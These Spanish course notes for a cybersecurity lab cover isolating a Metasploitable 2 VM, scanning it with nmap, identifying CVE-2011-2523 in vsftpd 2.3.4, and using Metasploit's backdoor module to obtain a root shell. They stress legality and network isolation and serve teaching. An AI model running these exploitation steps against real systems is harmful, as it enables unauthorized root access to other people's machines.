---
asignatura: Ciberseguridad
fecha: 2026-10-09
tema: Laboratorio 2 · del CVE al ataque · montaje de Metasploitable y explotación de vsftpd 2.3.4
fuente: CIBER_Lab02_Practica.pdf + Montaje_Metasploitable_VMware.pdf
---
# Ciber · Laboratorio 2 (09/10) · Del CVE al ataque

> Anterior: [Clase 3 / Práctica CVE](2026-09-29_clase3-donde-falla-un-sistema.md) · Cierra el hilo Clase 3 → Lab 1 → hoy

**No se entrega ni puntúa; las capturas valen para la Actividad 2.**

⚠️ El ataque solo se hace contra la máquina de prácticas (Metasploitable), en una red aislada. Contra cualquier otro equipo o red es delito (arts. 197 y 264 CP). Es lo que separa una auditoría de un ataque.

## Montaje: Kali + Metasploitable en red aislada
- **Metasploitable 2**: máquina Ubuntu llena de fallos a propósito (de Rapid7, en SourceForge), para servir de diana. Viene lista en formato VMware (`.vmx` + `.vmdk`): no hay que crear ni configurar disco, solo abrir el `.vmx`.
- Credenciales: `msfadmin` / `msfadmin`.
- **Red: SIEMPRE "Solo-anfitrión" (host-only), nunca en puente.** Metasploitable es "un colador con shell de root": en puente cogería una IP real de la red de casa y quedaría expuesta al router y a todos los dispositivos. Kali también en host-only, para que se vean solo entre ellas.
- Comprobaciones:
  ```bash
  # dentro de Metasploitable
  ifconfig                 # inet addr de eth0 = IP_DIANA
  ping -c3 8.8.8.8          # NO debe contestar -> confirma que está aislada
  # desde Kali
  ping -c3 IP_DIANA         # SÍ debe contestar -> confirma que se ven entre ellas
  ```
- Si al arrancar pregunta si la VM fue copiada o movida: responder **"La copié"**.

## 1 · Recon desde Kali
```bash
nmap -sV scanme.nmap.org            # sitio de prácticas, para comparar
nmap -sV IP_DIANA                   # 21/tcp open ftp vsftpd 2.3.4
```
La columna de versión es lo que delata la máquina. Captura la salida.

## 2 · El CVE de hoy
Buscado en **nvd.nist.gov** y **cvedetails.com**: `vsftpd 2.3.4` → **CVE-2011-2523**. Apuntar nota CVSS y qué permite.

## 3 · El ataque (Metasploit) — del CVE al módulo, enlazado
En vez de ir directo al exploit, se busca en Metasploit **por el CVE encontrado en el recon**:
```bash
msfconsole
search cve:2011-2523                                # también vale: search vsftpd
# resultado: exploit/unix/ftp/vsftpd_234_backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
info                                                 # qué hace el módulo, el CVE, referencias
show options                                         # comprobar que no falta nada (sobre todo RHOSTS)
set RHOSTS IP_DIANA
run                                                   # abre una shell de root
id                                                    # uid=0(root): dentro, y como root
hostname                                              # metasploitable
```
Flujo con sentido: `search` (por el CVE del recon) → `info` (qué hace y sus referencias) → `use` → `show options` → `set RHOSTS` → `run`. **`uid=0(root)` es la prueba de que se ha entrado**: la gracia no es romper nada, es ver que un servicio viejo sin actualizar es una puerta abierta.

## La historia del fallo (para que no se olvide)
En 2011 alguien coló una puerta trasera **en el propio código fuente** de vsftpd 2.3.4: si el usuario de FTP terminaba en `:)`, se abría una shell. Ni siquiera descargar "lo oficial" libra del todo de esto — por eso el software serio se firma y se verifica (la huella SHA-256 de la Clase 2) y, sobre todo, **se mantiene actualizado**: esto se arregló en días.

## Enlaces
Metasploitable 2 (SourceForge) · Kali Linux (kali.org/get-kali) · NVD CVE-2011-2523 · CVE Details CVE-2011-2523
